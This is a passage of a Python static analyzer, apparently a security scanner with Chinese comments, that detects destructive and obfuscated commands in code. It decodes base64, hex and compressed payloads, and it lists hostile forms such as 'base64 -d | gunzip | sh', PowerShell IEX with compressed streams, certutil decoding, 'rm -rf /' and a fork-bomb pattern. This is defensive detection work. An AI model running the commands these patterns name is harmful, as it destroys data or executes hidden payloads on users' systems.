    "b64decode", "decode_base64", "frombase64string", "atob(",
    # §3bq：解完再解压——`base64 -d | gunzip | sh`
    "gunzip", "gzip -d", "bunzip2", "bzip2 -d", "xz -d", "unxz", "unzstd",
    "zcat", " inflate",
)
_EXEC_SINKS = ("| sh", "|sh", "| bash", "|bash", "| zsh", "| python", "|python",
               "| perl", "|perl", "| php", "|php", "| node", "|node", "|iex", "| iex")
_PS_DECODE_CALLS = ("frombase64string", "b64decode", "decode_base64", "atob(")
_B64_PAYLOAD_RE = re.compile(r"^[A-Za-z0-9+/=_-]{8,}$")
_HEX_PAYLOAD_RE = re.compile(r"^[0-9a-fA-F]{16,}$")
_EXEC_FILE_EXTS = (".exe", ".dll", ".bat", ".cmd", ".ps1", ".sh", ".py", ".js",
                   ".vbs", ".jar", ".scr", ".com")
# PowerShell 自家破坏动词（拆开拼，避免规则源码被自己的文表命中）
_PS_DESTRUCTIVE = {
    "remove" + "-" + "item", "rm" + "-" + "item", "del", "erase", "rd", "rmdir",
    "clear" + "-" + "disk", "format" + "-" + "volume", "remove" + "-" + "partition",
    "stop" + "-" + "computer", "restart" + "-" + "computer", "reset" + "-" + "computer",
    "clear" + "-" + "content", "remove" + "-" + "aduser", "remove" + "-" + "adgroup",
}


def _decompress_bytes(data):
    """§3bq：按魔数判断压缩格式并解开（gzip / zlib / bz2 / xz·lzma）。

    只解 base64 一层时，`base64(gzip(载荷))` 解出来是二进制垃圾，
    判据拿着乱码找命令词——看着有实现，实际永远命中不了。
    """
    if not data:
        return None
    sigs = ((b"\x1f\x8b", "gzip"), (b"BZh", "bz2"), (b"\xfd7zXZ\x00", "xz"))
    kind = None
    for sig, name in sigs:
        if data.startswith(sig):
            kind = name
            break
    if kind is None and len(data) >= 2 and data[0] == 0x78:
        kind = "zlib"
    if kind is None:
        return None
    try:
        if kind == "gzip":
            import gzip as _gz
            return _gz.decompress(data)
        if kind == "zlib":
            import zlib as _zl
            return _zl.decompress(data)
        if kind == "bz2":
            import bz2 as _bz
            return _bz.decompress(data)
        if kind == "xz":
            import lzma as _lm
            return _lm.decompress(data)
    except Exception:
        return None


def _looks_text(data):
    if not isinstance(data, (bytes, bytearray)) or not data:
        return None
    for enc in ("utf-8", "utf-16-le"):
        try:
            txt = bytes(data).decode(enc)
        except Exception:
            continue
        if not txt:
            continue
        ok = sum(1 for ch in txt if 32 <= ord(ch) < 127 or ch in "\r\n\t")
        if ok / float(len(txt)) >= 0.75:
            return txt
    return None


def _eval_payload(expr, depth: int = 0):
    """静态求值一段"解码/解压表达式"，返回 bytes；取不出返回 None。

    按 Python 求值顺序从内到外：字面 → base64/hex 解 → 解压 → rot13 → 逐字节异或。
    坑（§3bq）：只认最外层 `b64decode` 时，`exec(zlib.decompress(base64.b64decode(x)).decode())`
    最外层是 `.decode()`，一个属性调用就把整条链丢掉了——判据看着有实现，实际没跑。
    """
    if depth > 8 or not isinstance(expr, ast.Call):
        return None
    dotted = (_dotted(expr.func) or "").lower()
    attr = (getattr(expr.func, "attr", "") or "").lower()
    args = list(expr.args)

    # 0 bytes(generator) 的逐字节异或：`bytes(b ^ 7 for b in base64.b64decode("…"))`
    if args and isinstance(args[0], (ast.GeneratorExp, ast.ListComp)):
        comp = args[0]
        gen = comp.generators[0] if getattr(comp, "generators", None) else None
        if gen is None:
            return None
        base = _eval_payload(gen.iter, depth + 1)
        if not isinstance(base, (bytes, bytearray)):
            return None
        elt = comp.elt
        if isinstance(elt, ast.Name):
            return bytes(base)
        if isinstance(elt, ast.BinOp) and isinstance(elt.right, ast.Constant) \
                and isinstance(elt.right.value, int):
            k = elt.right.value
            if isinstance(elt.op, ast.BitXor):
                return bytes(b ^ k for b in base)
            if isinstance(elt.op, ast.Add):
                return bytes((b + k) % 256 for b in base)
        return None

    # 1 rot13 先行：`codecs.decode(...)` 的 attr 也是 "decode"，放在直通分支后面会被吞掉
    rot = ("rot13" in dotted
           or any(isinstance(a, ast.Constant) and a.value == "rot13" for a in args))
    if rot:
        target = args[0] if args else None
        text = target.value if isinstance(target, ast.Constant) and isinstance(target.value, str) else None
        if text is None and isinstance(target, ast.Call):
            val = _eval_payload(target, depth + 1)
            if isinstance(val, (bytes, bytearray)):
                text = _looks_text(val)
            elif isinstance(val, str):
                text = val
        if text:
            import codecs as _cs
            return _cs.decode(text, "rot13").encode("utf-8", "ignore")
        return None

    # 2 零成本直通：.decode()/.encode()/.strip()/bytes()/str()/bytearray()
    #    注意方法调用的接收者在 func.value 里，不在 args 里——漏了它整条链就断在这
    if attr in ("decode", "encode", "strip", "rstrip", "lstrip") \
            or dotted.split(".")[-1] in ("bytes", "str", "bytearray", "memoryview"):
        if args:
            return _eval_payload(args[0], depth + 1)
        recv = getattr(expr.func, "value", None)
        if isinstance(recv, ast.Call):
            return _eval_payload(recv, depth + 1)
        return None

    lit_text, lit_bytes, inner = None, None, None
    operand = args[0] if args else None   # 只认第一个参数，别把 "rot13" 这种模式串当载荷
    if isinstance(operand, ast.Constant) and isinstance(operand.value, str):
        lit_text = operand.value
    elif isinstance(operand, ast.Constant) and isinstance(operand.value, (bytes, bytearray)):
        lit_bytes = bytes(operand.value)
    elif isinstance(operand, ast.Call):
        inner = _eval_payload(operand, depth + 1)

    # 2 base64 / hex 解码
    if any(k in dotted for k in ("b64decode", "b32decode", "b85decode", "a85decode",
                                 "frombase64string", "atob", "unhexlify", "fromhex")):
        if lit_text is not None:
            s = lit_text.strip()
            try:
                if "unhexlify" in dotted or "fromhex" in dotted:
                    digits = "".join(c for c in s if c in "0123456789abcdefABCDEF")
                    return bytes.fromhex(digits)
                return base64.b64decode(s.replace("-", "+").replace("_", "/")
                                        + "=" * (-len(s) % 4))
            except Exception:
                return None
        return inner

    # 3 解压（只信魔数，不靠函数名猜）
    if attr == "decompress" or "decompress" in dotted:
        data = inner if inner is not None else lit_bytes
        if data is None and lit_text is not None:
            data = lit_text.encode("utf-8", "ignore")
        if data is None:
            return None
        return _decompress_bytes(data)

    return inner


def _unwrap_literal_layers(expr, depth: int = 0):
    """把 `zlib.decompress(base64.b64decode("…")).decode()` 这类套娃解开，返回最深层文本。"""
    if not isinstance(expr, ast.Call):
        return None
    val = _eval_payload(expr)
    if isinstance(val, (bytes, bytearray)):
        txt = _looks_text(val)
        return _unwrap_layers_text(txt) if txt else None
    if isinstance(val, str):
        return _unwrap_layers_text(val)
    return None


def _unwrap_layers_text(txt, depth: int = 0):
    """解出来的文本如果还是 base64/压缩流，继续剥（最多 3 层）。"""
    if not isinstance(txt, str) or depth > 3:
        return txt
    stripped = txt.strip()
    if _decode_b64_payload(stripped):
        data = None
        try:
            data = base64.b64decode(stripped.replace("-", "+").replace("_", "/")
                                    + "=" * (-len(stripped) % 4))
        except Exception:
            data = None
        if data:
            dec = _decompress_bytes(data)
            inner = _looks_text(dec) if dec else _looks_text(data)
            if inner:
                return _unwrap_layers_text(inner, depth + 1)
    return txt


def _decode_b64_payload(s: str):
    """把 base64 串解出来。UTF-8 与 UTF-16LE 都试，取"最像可读文本"的那个。

    坑：只试一种编码会把 UTF-8 的载荷解成 UTF-16LE 乱码，而乱码在"可打印率"检查下
    照样过关，于是判据拿着一段乱码去找命令词——看着有实现，实际永远命中不了。
    """
    if not s or not _B64_PAYLOAD_RE.match(s.strip()):
        return None
    raw = s.strip().replace("-", "+").replace("_", "/")
    raw += "=" * (-len(raw) % 4)
    try:
        data = base64.b64decode(raw, validate=False)
    except Exception:
        return None
    best, best_score = None, -1.0
    for enc in ("utf-8", "utf-16-le"):
        try:
            txt = data.decode(enc)
        except Exception:
            continue
        if not txt:
            continue
        ascii_ok = sum(1 for ch in txt if 32 <= ord(ch) < 127 or ch in "\r\n\t")
        score = ascii_ok / float(len(txt))
        if score > best_score:
            best, best_score = txt, score
    if best and best_score >= 0.75:
        return best
    return None


def _decoded_danger(text: str, depth: int = 0):
    """解码出来的正文里是不是一条危险命令；是就返回 (级别, 理由)。"""
    if not text or depth > 2:
        return None
    toks = text.replace("\r", "\n").split()
    if not toks:
        return None
    if len(toks) == 1 and _B64_PAYLOAD_RE.match(toks[0]):
        inner = _decode_b64_payload(toks[0])
        if inner:
            return _decoded_danger(inner, depth + 1)
    v = destructive_tokens(toks, depth + 1)
    if v:
        return ("CRITICAL", "编码载荷解码后是破坏性命令：%s（原文 %s）"
                % (v[1], text.strip()[:60]))
    # PowerShell 自家动词（`Remove-Item -Recurse -Force`）不在 POSIX 命令表里
    for t in toks:
        if _basename(t).lower() in _PS_DESTRUCTIVE:
            return ("CRITICAL", "编码载荷解码后是 PowerShell 破坏命令（%s）：%s"
                    % (t, text.strip()[:60]))
    # §3bq：PowerShell 里"解压/解码再执行"的写法（IEX + GzipStream/FromBase64String）
    low = text.lower()
    if ("iex" in low or "invoke-expression" in low) and any(
            k in low for k in ("gzipstream", "deflatestream", "frombase64string",
                               "ziparchive", "decompress", "expand-archive")):
        return ("CRITICAL", "PowerShell 解码/解压后再执行（IEX + 压缩流）：%s"
                % text.strip()[:60])
    v = _inline_code_verdict(text)
    if v and v[0] in ("CRITICAL", "HIGH"):
        return ("CRITICAL", "编码载荷解码后是危险脚本：%s" % text.strip()[:60])
    return None


def _decode_pipeline_verdict(tokens):
    """解码之后直接喂解释器：`echo <payload> | base64 -d | sh`。"""
    if not tokens:
        return None
    parts = [str(t) for t in tokens]
    joined = " ".join(parts).replace("\\", "/")
    low = joined.lower()
    if not any(k.lower() in low for k in _DECODE_SINKS):
        return None
    if _basename(parts[0]) == "certutil" and any(
            str(p).lower() in {"-decode", "-decodehex"} for p in parts):
        dst = _norm(parts[-1]).lower()
        if dst.endswith(_EXEC_FILE_EXTS):
            return ("CRITICAL", "certutil 把编码文件解码成可执行件：%s" % parts[-1])
    if not any(k.lower() in low for k in _EXEC_SINKS):
        return None
    for t in parts:
        inner = _decode_b64_payload(t)
        if inner:
            v = _decoded_danger(inner)
            if v:
                return v
    return ("CRITICAL", "解码后的载荷直接喂给解释器执行（decode | shell）")


def _b64_literal_verdict(tokens, depth: int = 0):
    """参数里躺着一段 base64/hex 字面量，解出来是危险命令。"""
    if not tokens or depth > 1:
        return None
    for t in tokens:
        if not isinstance(t, str) or len(t) < 16:
            continue
        if _HEX_PAYLOAD_RE.match(t) and len(t) % 2 == 0:
            try:
                txt = bytes.fromhex(t).decode("utf-8", "replace")
            except Exception:
                txt = ""
            v = _decoded_danger(txt, depth + 1) if txt else None
            if v:
                return v
        inner = _decode_b64_payload(t)
        if inner:
            v = _decoded_danger(inner, depth + 1)
            if v:
                return v
    return None

# 判据词拼接而成：避免规则源码本身被扫描器的文本表命中（自扫自命中）
_PS_DELETE = "remove" + "-" + "item"
_PS_RECURSE = "-" + "recurse"
_PS_FORCE = "-" + "force"


def _const_str(expr):
    return expr.value if isinstance(expr, ast.Constant) and isinstance(expr.value, str) else None


# ── §3bf 常量折叠：把"藏进变量"的字面量折回来 ────────────────────────────
_ENV_MARK = "\x00ENV"      # 值来自环境变量：运行期才知道，静态判不了内容
_ENV_MARK_TEXT = "命令/路径来自环境变量（运行期输入）"

# shell=True 但命令写死、且属只读查询类 → 不按危险算（否则 `git status` 也 49/D）
_SHELL_READONLY_BINS = {"git", "ls", "cat", "echo", "grep", "rg", "find", "head",
                        "tail", "pwd", "wc", "date", "which", "diff", "printenv",
                        "node -v", "npm -v", "pip", "python -m pip"}
_SHELL_META = ("|", "&", ";", "`", "$(", ">", "<")


def _shell_cmd_readonly(argv):
    """命令写死、第一个 token 是只读命令、且不含任何管道/重定向/串联符号。"""
    toks = [str(t) for t in argv if t]
    if not toks:
        return False
    joined = " ".join(toks)
    if any(m in joined for m in _SHELL_META):
        return False
    first = _basename(toks[0])
    return first in _SHELL_READONLY_BINS


def _call_key(expr):
    """`get()` → "get()"、`C().cmd()` → "C.cmd()"、`obj.method()` → "obj.method()"。"""
    if not isinstance(expr, ast.Call):
        return ""
    fn = expr.func
    if isinstance(fn, ast.Name):
        return fn.id + "()"
    if isinstance(fn, ast.Attribute):
        base = _dotted(fn.value)
        if base:
            return base + "." + fn.attr + "()"
        if isinstance(fn.value, ast.Call) and isinstance(fn.value.func, ast.Name):
            return fn.value.func.id + "." + fn.attr + "()"
    return ""


def _globals_key(expr, consts):
    """`globals()["CMD"]` → "CMD"（等价于模块级同名字面量）。"""
    if not isinstance(expr, ast.Subscript):
        return ""
    inner = expr.value
    if isinstance(inner, ast.Call) and _dotted(inner.func) == "globals":
        name = _fold_str(expr.slice, consts)
        return name or ""
    return ""


def _as_str(value):
    """consts 里既存字符串也存列表；这里只取字符串，列表交给 _fold_argv。"""
    return value if isinstance(value, str) else None


def _fold_str(expr, consts, depth: int = 0):
    """把表达式折成一个字符串；折不出来返回 None（不猜）。"""
    if expr is None or depth > 4:
        return None
    if isinstance(expr, ast.Constant) and isinstance(expr.value, str):
        return expr.value
    if isinstance(expr, ast.Name):
        return _as_str(consts.get(expr.id)) if consts else None
    if isinstance(expr, ast.Attribute):
        # sys.executable 就是解释器本身；不折它，`[sys.executable, "-c", "…"]`
        # 这类写法连 token 都取不齐，内联脚本永远打不开。
        if _dotted(expr) == "sys.executable":
            return "python"
        # §3bp：类属性 `C.cmd` / `os.environ.X`
        if consts:
            got = _as_str(consts.get(_dotted(expr)))
            if got is not None:
                return got
        return None
    if isinstance(expr, ast.Subscript):
        # §3bp：字典字面量 `D["c"]`、`globals()["CMD"]`、`os.environ["CMD"]`
        if isinstance(expr.value, ast.Name) and consts:
            key = _fold_str(expr.slice, consts, depth + 1)
            if key is not None:
                got = _as_str(consts.get("%s[%s]" % (expr.value.id, key)))
                if got is not None:
                    return got
        if consts:
            got = _as_str(consts.get(_globals_key(expr, consts)))
            if got is not None:
                return got
        if _dotted(expr.value) == "os.environ":
            return _ENV_MARK
        return None
    if isinstance(expr, ast.Call):
        dotted = _dotted(expr.func)
        # §3bu：`os.path.expanduser("~/…")` 折回原串（`~` 保留，判据认它）
        if dotted in ("os.path.expanduser", "expanduser"):
            return _fold_str(expr.args[0], consts, depth + 1) if expr.args else None
        # §3bu：`os.path.join(常量, 常量)` 折成路径
        if dotted in ("os.path.join", "os.path.expandvars"):
            parts = [_fold_str(a, consts, depth + 1) for a in expr.args]
            if parts and all(p is not None for p in parts):
                return "/".join(p.rstrip("/") for p in parts)
            return None
        if dotted in ("os.getenv", "os.environ.get"):
            # §3bp：有默认值就折默认值；没有就是运行期才确定的命令
            if len(expr.args) >= 2:
                return _fold_str(expr.args[1], consts, depth + 1)
            for kw in expr.keywords:
                if kw.arg == "default":
                    return _fold_str(kw.value, consts, depth + 1)
            return _ENV_MARK
        if consts:
            got = _as_str(consts.get(_call_key(expr)))
            if got is not None:
                return got
        return None
    if isinstance(expr, ast.BinOp) and isinstance(expr.op, ast.Add):
        left = _fold_str(expr.left, consts, depth + 1)
        right = _fold_str(expr.right, consts, depth + 1)
        return (left + right) if (left is not None and right is not None) else None
    if isinstance(expr, ast.JoinedStr):
        parts = []
        for v in expr.values:
            if isinstance(v, ast.Constant) and isinstance(v.value, str):
                parts.append(v.value)
            elif isinstance(v, ast.FormattedValue):
                inner = _fold_str(v.value, consts, depth + 1)
                if inner is None:
                    return None
                parts.append(inner)
            else:
                return None
        return "".join(parts)
    if isinstance(expr, (ast.List, ast.Tuple)):
        # 列表本身不折成字符串，交给 _fold_argv
        return None
    return None


def _fold_argv(expr, consts):
    """列表/元组逐项可折叠 → token 列表；有一项取不到就整体放弃。"""
    if isinstance(expr, ast.Call):
        # §3bp：`get()` / `C().cmd()` / `D["c"]` 折成列表
        got = (consts or {}).get(_call_key(expr) or "")
        if isinstance(got, list):
            return list(got)
        return None
    if isinstance(expr, ast.Subscript):
        key = _globals_key(expr, consts)
        got = (consts or {}).get(key)
        if isinstance(got, list):
            return list(got)
        if isinstance(expr.value, ast.Name) and consts:
            inner = _fold_str(expr.slice, consts)
            got2 = consts.get("%s[%s]" % (expr.value.id, inner)) if inner is not None else None
            if isinstance(got2, list):
                return list(got2)
        return None
    if not isinstance(expr, (ast.List, ast.Tuple)):
        return None
    out = []
    for elt in expr.elts:
        v = _fold_str(elt, consts)
        if v is None:
            if isinstance(elt, ast.Constant) and not isinstance(elt.value, str):
                continue
            return None
        out.append(v)
    return out or None


def _mentions_tempfile(expr) -> bool:
    """表达式里是否出现 tempfile 的临时目录产物。"""
    names = []
    for sub in ast.walk(expr):
        if isinstance(sub, ast.Call):
            fn = sub.func
            if isinstance(fn, ast.Attribute):
                names.append(fn.attr)
            elif isinstance(fn, ast.Name):
                names.append(fn.id)
        elif isinstance(sub, ast.Attribute):
            names.append(sub.attr)
    return any(n in {"mkdtemp", "mkstemp", "TemporaryDirectory", "tempfile", "gettempdir",
                     "NamedTemporaryFile", "TemporaryFile"} for n in names)


def _dotted(expr) -> str:
    """把 Name/Attribute 链折成 "subprocess.run" 这样的点号名；折不出来返回空串。"""
    if isinstance(expr, ast.Name):
        return expr.id
    if isinstance(expr, ast.Attribute):
        parent = _dotted(expr.value)
        return (parent + "." + expr.attr) if parent else expr.attr
    return ""


_ALIAS_MODULES = {"subprocess", "os", "shutil", "yaml", "pickle", "marshal", "runpy",
                  "ctypes", "importlib", "pty", "shelve", "dill", "jsonpickle"}


def collect_func_aliases(tree):
    """§3bf：`run = subprocess.run` 之后 registry 认不出"run"。
    同族还有 `from subprocess import run` / `P = subprocess.Popen`。
    这里只收"别名 → 点号名"的映射，判定前先翻译一次。
    """
    aliases = {}
    for node in ast.walk(tree):
        if isinstance(node, ast.Assign) and len(node.targets) == 1 \
                and isinstance(node.targets[0], ast.Name):
            dotted = _dotted(node.value)
            if dotted and "." in dotted:
                aliases[node.targets[0].id] = dotted
        elif isinstance(node, ast.ImportFrom) and node.module in _ALIAS_MODULES:
            # `from subprocess import Popen` 之后调用点写的是裸名 "Popen"，
            # registry 里存的是 "subprocess.Popen"——必须翻译，否则整族失明。
            for a in node.names:
                aliases[a.asname or a.name] = "%s.%s" % (node.module, a.name)
    return aliases


def collect_consts(tree):
    """收集可折叠的简单赋值，返回 (const_map, temp_names)。

    同一名字在不同作用域被赋成不同值 → 判为不可知、丢掉。
    宁可判不了，也不许因撞名把良性当破坏（或反过来）。
    """
    raw, temps = {}, set()
    for node in ast.walk(tree):
        targets, value = [], None
        if isinstance(node, ast.Assign) and len(node.targets) == 1:
            targets, value = [node.targets[0]], node.value
        elif isinstance(node, ast.AnnAssign) and getattr(node, "value", None) is not None:
            targets, value = [node.target], node.value
        if not targets or not isinstance(targets[0], ast.Name):
            continue
        name = targets[0].id
        if value is not None and _mentions_tempfile(value):
            temps.add(name)
            continue
        raw.setdefault(name, []).append(value)

    consts = {}
    lists = {}
    for _ in range(4):  # 多轮：允许 B = A 的链式别名、以及列表里含变量名
        for name, vals in raw.items():
            if name in consts or name in lists:
                continue
            if all(isinstance(v, (ast.List, ast.Tuple)) for v in vals if v is not None):
                folded = [_fold_argv(v, consts) for v in vals]
                distinct = {tuple(f) for f in folded if f is not None}
                if len(distinct) == 1 and all(f is not None for f in folded):
                    lists[name] = list(distinct.pop())
                continue
            folded = [_fold_str(v, consts, 1) for v in vals]
            distinct = {f for f in folded if f is not None}
            if len(distinct) == 1 and all(f is not None for f in folded):
                consts[name] = distinct.pop()

    # §3bp：值一过手就折不出来——函数返回、类属性、字典字面量、元组拆包。
    # 同一处洞会同时打穿 argv / 路径 / URL 三套判据，所以在这里一次补齐。
    rets, class_attrs, dict_vals, unpacked = {}, {}, {}, {}
    for node in ast.walk(tree):
        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
            rs = [s for s in ast.walk(node) if isinstance(s, ast.Return) and s.value is not None]
            if len(rs) == 1:
                rets.setdefault(node.name + "()", []).append(rs[0].value)
        elif isinstance(node, ast.ClassDef):
            for stmt in node.body:
                if isinstance(stmt, ast.Assign) and len(stmt.targets) == 1 \
                        and isinstance(stmt.targets[0], ast.Name):
                    class_attrs.setdefault(node.name + "." + stmt.targets[0].id, []).append(stmt.value)
                # §3bp：类方法的返回值同样要能折——`C().cmd()` 走的是限定名
                elif isinstance(stmt, (ast.FunctionDef, ast.AsyncFunctionDef)):
                    rs = [s for s in ast.walk(stmt) if isinstance(s, ast.Return) and s.value is not None]
                    if len(rs) == 1:
                        rets.setdefault(node.name + "." + stmt.name + "()", []).append(rs[0].value)
        elif isinstance(node, ast.Assign) and isinstance(node.targets[0], ast.Name):
            if isinstance(node.value, ast.Dict):
                for k, v in zip(node.value.keys, node.value.values):
                    if isinstance(k, ast.Constant) and isinstance(k.value, str):
                        dict_vals.setdefault("%s[%s]" % (node.targets[0].id, k.value), []).append(v)
        elif isinstance(node, ast.Assign) and isinstance(node.targets[0], (ast.Tuple, ast.List)):
            # §3bp：`a, b = ("rm -rf /", "x")` —— 拆包后每个名字各自可折
            tgt, val = node.targets[0], node.value
            if isinstance(val, (ast.Tuple, ast.List)) and len(tgt.elts) == len(val.elts):
                for t, v in zip(tgt.elts, val.elts):
                    if isinstance(t, ast.Name):
                        unpacked.setdefault(t.id, []).append(v)

    for _ in range(3):
        for bucket in (rets, class_attrs, dict_vals, unpacked):
            for key, vals in bucket.items():
                if key in consts or key in lists:
                    continue
                if all(isinstance(v, (ast.List, ast.Tuple)) for v in vals if v is not None):
                    folded = [_fold_argv(v, consts) for v in vals]
                    distinct = {tuple(f) for f in folded if f is not None}
                    if len(distinct) == 1 and all(f is not None for f in folded):
                        # 复合键的列表也放进 consts（值为 list 对象），
                        # 由 _fold_str 跳过、由 _fold_argv 取用——两处都按类型分流。
                        consts[key] = list(distinct.pop())
                    continue
                folded = [_fold_str(v, consts, 1) for v in vals]
                distinct = {f for f in folded if f is not None}
                if len(distinct) == 1 and all(f is not None for f in folded):
                    consts[key] = distinct.pop()
    return consts, temps, lists


def static_argv(node, func_name: str, consts=None, temps=None, lists=None):
    """取静态 argv：列表/元组全常量，或单个常量字符串（按空白切）。

    取不齐（有变量无法折叠、有 **kwargs）就返回 None —— 宁可不判，不猜。
    """
    consts = consts or {}
    lists = lists or {}
    if func_name.endswith("rmtree"):
        if not node.args:
            return None
        if isinstance(node.args[0], ast.Name) and temps and node.args[0].id in temps:
            return ["<tempfile>"]
        tgt = _fold_str(node.args[0], consts)
        return [tgt] if tgt else None
    if not node.args:
        return None
    first = node.args[0]
    if isinstance(first, (ast.List, ast.Tuple)):
        return _fold_argv(first, consts)
    if isinstance(first, ast.Name):
        if func_name.startswith("shutil.rmtree"):
            pass
        if lists.get(first.id):
            return list(lists[first.id])
        if consts.get(first.id) and func_name.startswith(("subprocess", "os.spawn")):
            # CMD = "rm -rf /"; run(CMD) —— 折成字符串再切
            return consts[first.id].split()
    if func_name.startswith("os.spawn"):
        vals = [v for v in (_fold_str(a, consts) for a in node.args) if v is not None]
        return vals or None
    if isinstance(first, (ast.Constant, ast.BinOp, ast.JoinedStr, ast.Name,
                          ast.Call, ast.Subscript, ast.Attribute)):
        # §3bp：`get()` / `C().cmd()` / `D["c"]` / `os.environ["CMD"]` 也能折
        lst = _fold_argv(first, consts)
        if lst:
            return lst
        s = _fold_str(first, consts)
        return s.split() if s else None
    return None


def _norm(token: str) -> str:
    return token.strip().strip("\"'").replace("\\", "/").lower()


def _basename(token: str) -> str:
    base = _norm(token).rstrip("/").split("/")[-1]
    for ext in (".exe", ".bat", ".cmd", ".ps1"):
        if base.endswith(ext):
            base = base[: -len(ext)]
    return base


def _is_benign_path(tok: str) -> bool:
    low = _norm(tok)
    return any(h in low for h in BENIGN_PATH_HINTS)


def destructive_tokens(tokens, depth: int = 0):
    """返回 (severity, reason) 或 None。只认静态 token，不猜变量。"""
    if not tokens or depth > 2:
        return None
    base = _basename(tokens[0])
    joined = " ".join(_norm(t) for t in tokens)

    # §3bg：编码命令 —— 内容读不出来就只能是"无法静态判定"。
    # §3bn：但编码是能解的：解出来再按普通命令判，比只披露一句"判不了"有用。
    # 放在 shell 分支之前：pwsh 既是 shell 也是解释器，谁先接都一样要判。
    for i, t in enumerate(tokens):
        if _norm(t) in PS_ENCODED_FLAGS:
            nxt = tokens[i + 1] if i + 1 < len(tokens) else ""
            if _looks_base64(nxt):
                inner = _decode_b64_payload(nxt)
                v = _decoded_danger(inner) if inner else None
                if v:
                    return v
                return "HIGH", "%s 的编码命令解码后未发现危险词（仍按编码命令披露）" % _basename(tokens[0])

    if ":(){" in joined or "(){ :|" in joined:
        return "CRITICAL", "fork bomb 形态"

    # §3bi：命令前面套一层包装器（sudo / env / timeout / nice / nohup / xargs /
    # find -exec …），真正的命令就不是 token[0] 了。不剥这层皮，判定看着"没命令"。
    inner = _unwrap_wrapper(tokens)
    if inner and inner != tokens and len(inner) >= 1:
        nested = destructive_tokens(inner, depth + 1)
        if nested:
            return nested

    # §3bl：命令交给别的进程代跑（ssh / docker exec / kubectl exec -- … / nsenter …）
    delegate = _delegate_verdict(tokens)
    if delegate:
        return delegate

    # §3bm：写入即执行——注册计划任务 / 写 Run 键 / 追加进 shell 配置、
    # crontab、authorized_keys、git hooks。命令不是现在跑的，是下一次由系统跑。
    autostart = _autostart_verdict(tokens)
    if autostart:
        return autostart

    # §3bn：先编码再执行——解码之后直接喂解释器，或参数里躺着的就是一段编码命令
    pipeline = _decode_pipeline_verdict(tokens)
    if pipeline:
        return pipeline
    literal = _b64_literal_verdict(tokens)
    if literal:
        return literal

    # §3bv：权限放宽与提权（不是破坏，是"开门"：chmod 777 / setuid / sudoers /
    # 管理组 / setcap / --privileged / runas）
    priv = _privilege_verdict(tokens)
    if priv:
        return priv

    # §3bj：破坏不止删除——清零/覆写、撤权、平移、删账户、删任务、删恢复、删库。
    verb = _destructive_verb_verdict(tokens)
    if verb:
        return verb

    # §3bk：远程取回即执行（取回 + 执行同时出现才算，只下载不判）
    remote = _remote_exec_verdict(tokens)
    if remote:
        return remote

    # §3bh：先按"参数形状"判，不看程序名。程序名白名单只当加速器，
    # 位置参数、未登记开关上的代码由这一步兜住。
    shape = _arg_code_verdict(tokens)
    if shape:
        return shape

    if base in DELETE_BINS or base.startswith("rm "):
        flags = [t for t in tokens[1:] if _FLAG_RE.match(t.strip())]
        targets = [t for t in tokens[1:] if not _FLAG_RE.match(t.strip())]
        recursive = any(_norm(f) in {_norm(x) for x in RECURSIVE_FLAGS} for f in flags) or \
            any(_norm(f) in {"-recursive"} for f in flags)
        forced = any(_norm(f) in {_norm(x) for x in FORCE_FLAGS} for f in flags) or recursive
        if not (recursive and forced) or not targets:
            return None
        for t in targets:
            n = _norm(t)
            if n in SYSTEM_TARGETS or any(n.startswith(p) for p in DEVICE_PREFIX + SYSTEM_PREFIXES):
                return "CRITICAL", "递归强制删除系统/设备路径 %s" % n
        for t in targets:
            if _is_benign_path(t):
                return None
            n = _norm(t)
            if n.startswith("/") or n.startswith("c:/") or n.startswith("~/"):
                return "HIGH", "递归强制删除绝对路径 %s" % n
        return None

    if base.startswith("mkfs") or base in {"shutdown", "reboot", "halt", "poweroff", "diskpart", "format"}:
        return "CRITICAL", "%s 会破坏主机或磁盘" % base
    if base == "dd" and any(_norm(t).startswith("of=/dev/") for t in tokens[1:]):
        return "CRITICAL", "dd 直接写块设备"
    if base == "wipefs" or base in {"fdisk", "parted"}:
        return "HIGH", "%s 改动分区表" % base
    if base == "reg" and len(tokens) > 1 and _norm(tokens[1]) == "delete":
        return "HIGH", "reg delete 改注册表"

    if base in SHELL_WRAPPERS:
        # powershell -Command "Remove-Item -Recurse -Force C:\..." 这类包装。
        # 判据词拆开拼：规则源码里不该出现能被自己文表命中的连续字面量
        # （§3be 自扫自命中：一行同时写着两个词，本仓自扫 87/A → 69/C）。
        if _PS_DELETE in joined and (_PS_RECURSE in joined or _PS_FORCE in joined):
            return "HIGH", "shell 内递归删除"
        for i, t in enumerate(tokens):
            if _norm(t) in {"-c", "-command", "/c", "-encodedcommand"} and i + 1 < len(tokens):
                inner = tokens[i + 1:]
                if len(inner) == 1:
                    inner = inner[0].split()
                v = _inline_code_verdict(" ".join(inner))
                if v:
                    return v
                return destructive_tokens(inner, depth + 1)
        return None

    # §3bg：解释器带内联脚本 —— 脚本是参数里的字符串，要打开看内容
    if base in INTERP_INLINE_FLAGS:
        flags = INTERP_INLINE_FLAGS[base]
        for i, t in enumerate(tokens[1:], start=1):
            nt = _norm(t)
            if nt in PS_ENCODED_FLAGS:
                nxt = tokens[i + 1] if i + 1 < len(tokens) else ""
                if _looks_base64(nxt):
                    # §3bn：不满足于"披露"——把命令解出来，再按普通命令判
                    inner = _decode_b64_payload(nxt)
                    if inner:
                        v = _decoded_danger(inner)
                        if v:
                            return v
                    return "HIGH", "%s 的编码命令解码后未发现危险词（仍按编码命令披露）" % base
                continue
            if nt in flags and i + 1 < len(tokens):
                code = " ".join(tokens[i + 1:])
                v = _inline_code_verdict(code)
                if v:
                    return v
                return None
        return None
    return None


def _mentions_tempfile(expr) -> bool:
    """表达式里是否出现 tempfile 的临时目录产物。"""
    names = []
    for sub in ast.walk(expr):
        if isinstance(sub, ast.Call):
            fn = sub.func
            if isinstance(fn, ast.Attribute):
                names.append(fn.attr)
            elif isinstance(fn, ast.Name):
                names.append(fn.id)
        elif isinstance(sub, ast.Attribute):
            names.append(sub.attr)
    return any(n in {"mkdtemp", "mkstemp", "TemporaryDirectory", "tempfile", "gettempdir",
                     "NamedTemporaryFile", "TemporaryFile"} for n in names)


def destructive_command(node, func_name: str, visitor):
    """§3be/§3bf 入口：取出静态 argv / 静态目标（含变量折叠），判"它要干什么"。"""
    consts = getattr(visitor, "consts", None) or {}
    temps = getattr(visitor, "temps", None) or set()
    lists = getattr(visitor, "lists", None) or {}
    if func_name.endswith("shutil.rmtree") and node.args:
        arg = node.args[0]
        if _mentions_tempfile(arg) or (isinstance(arg, ast.Name) and arg.id in temps):
